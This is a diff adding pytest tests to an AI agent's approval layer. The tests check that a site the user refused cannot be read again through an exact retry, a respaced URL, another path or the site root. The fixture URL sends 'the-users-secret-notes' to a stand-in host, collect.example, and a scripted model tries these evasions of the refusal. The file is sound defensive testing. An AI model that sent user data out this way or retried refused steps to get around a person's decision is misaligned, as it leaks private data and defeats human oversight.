@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import pytest
 
+from localmelo.melo.agent import Agent
 from localmelo.melo.contracts.approvals import (
     AllowAllPolicy,
     ApprovalDecision,
@@ -22,8 +23,18 @@ from localmelo.melo.contracts.approvals import (
     find_earlier,
 )
 from localmelo.melo.contracts.review import loose_keys
+from localmelo.melo.schema import Message, ToolDef
+from localmelo.support.browser import sites
 
-from .test_approvals import Policy, Recorder, ScriptedLLM, _agent, _answer, _deploy
+from .test_approvals import (
+    Policy,
+    Recorder,
+    ScriptedLLM,
+    _agent,
+    _answer,
+    _calls,
+    _deploy,
+)
 
 
 @pytest.mark.asyncio
@@ -186,3 +197,111 @@ def test_a_block_of_another_kind_keys_the_whole_command_only() -> None:
     assert policy.match("shell_exec", {"command": "make"}, "/w") is None
     spaced = {"command": "rm  -rf build  &&  make"}
     assert policy.match("shell_exec", spaced, "/w") == ("Auto mode", False)
+
+
+# ── A step blocked through a tool's own question (a site it asked about) ──
+
+SITE = "https://collect.example"
+LEAK = f"{SITE}/upload?notes=the-users-secret-notes"
+READ_SITE = ToolDef(
+    name="read_site",
+    description="Read a web page",
+    parameters={
+        "type": "object",
+        "properties": {"url": {"type": "string"}},
+        "required": ["url"],
+    },
+    annotations={"readOnlyHint": True},
+)
+
+
+class Reader:
+    """``read_site`` asks about its site as web_fetch does; ``read`` keeps each page it read."""
+
+    def __init__(self) -> None:
+        self.read: list[str] = []
+
+    async def read_site(self, url: str) -> str:
+        # The call itself asks nothing (read tier): the site question decides.
+        await sites.require_site(sites.require_origin(url), via="web_fetch", url=url)
+        self.read.append(url)
+        return "page text"
+
+
+def _reader(llm: ScriptedLLM) -> tuple[Agent, Reader]:
+    agent, _ = _agent(llm)
+    reader = Reader()
+    agent.hippo.register_tool(READ_SITE)
+    agent.executor.register("read_site", reader.read_site)
+    return agent, reader
+
+
+def _reads(*urls: str) -> Message:
+    return _calls(
+        *((("read_site", {"url": url}, f"read_{n}")) for n, url in enumerate(urls))
+    )
+
+
+@pytest.mark.asyncio
+async def test_a_site_its_tool_asked_about_and_was_refused_keeps_its_keys() -> None:
+    llm = ScriptedLLM([_reads(LEAK), _answer("Could not read it.")])
+    agent, reader = _reader(llm)
+    recorder = Recorder()
+    denied = Policy(ApprovalDecision(False, "not that site", origin="user"))
+
+    await agent.run_task("summarise my notes", on_event=recorder, approval=denied)
+
+    assert reader.read == [] and len(denied.requests) == 1
+    [finished] = recorder.of("tool.finished")
+    # The call's own approval was never asked (read tier); its site question was.
+    assert finished.data["approval"] is None
+    [asked] = finished.data["tool_asks"]
+    question = denied.requests[0]
+    assert asked["tool"] == f"browser:{SITE}" and asked["origin"] == "user"
+    assert asked["allowed"] is False and asked["preview"] == f"read {LEAK}"
+    root = agent.executor.workspace_root
+    assert asked["call_key"] == call_key(question.tool_name, question.arguments, root)
+    # Any later question about the same site is a step alike.
+    assert asked["loose_keys"] == [f"ask:browser:{SITE}"]
+
+
+@pytest.mark.asyncio
+async def test_the_model_cannot_retry_a_refused_site_exactly_respaced_or_by_another_path() -> (
+    None
+):
+    # The first run: the person refused the site its tool asked about.
+    first = ScriptedLLM([_reads(LEAK), _answer("Could not read it.")])
+    agent, _ = _reader(first)
+    denied = Policy(ApprovalDecision(False, "not that site", origin="user"))
+    await agent.run_task("summarise my notes", approval=denied)
+    [question] = denied.requests
+    blocked = call_key(
+        question.tool_name, question.arguments, agent.executor.workspace_root
+    )
+
+    # The task continued on its own: the model tries the same step again, the
+    # same address respaced, another page of the site, and the site's root.
+    other = f"{SITE}/other?notes=the-users-secret-notes"
+    again = ScriptedLLM(
+        [_reads(LEAK, f"  {LEAK} ", other, SITE.upper() + "/"), _answer("Gave up.")]
+    )
+    retry, reader = _reader(again)
+    # Asked, the inner policy would allow it: nothing may reach it.
+    inner = Policy(ApprovalDecision(True, origin="user"))
+    policy = EarlierBlocks(
+        inner, {blocked: ("the user", "")}, {blocked: [f"ask:browser:{SITE}"]}
+    )
+    later = Recorder()
+
+    await retry.run_task("summarise my notes", on_event=later, approval=policy)
+
+    assert reader.read == [], "no page of the refused site was read"
+    assert inner.requests == [], "refused before anyone was asked"
+    exact, respaced, path, root = again.tool_messages(1)
+    assert "the user blocked this exact step earlier in this task" in exact
+    assert "the user blocked this exact step earlier in this task" in respaced
+    assert "the user blocked a step like this one earlier in this task" in path
+    assert "the user blocked a step like this one earlier in this task" in root
+    for finished in later.of("tool.finished"):
+        [refused] = finished.data["tool_asks"]
+        assert refused["earlier"] == "the user" and "call_key" not in refused
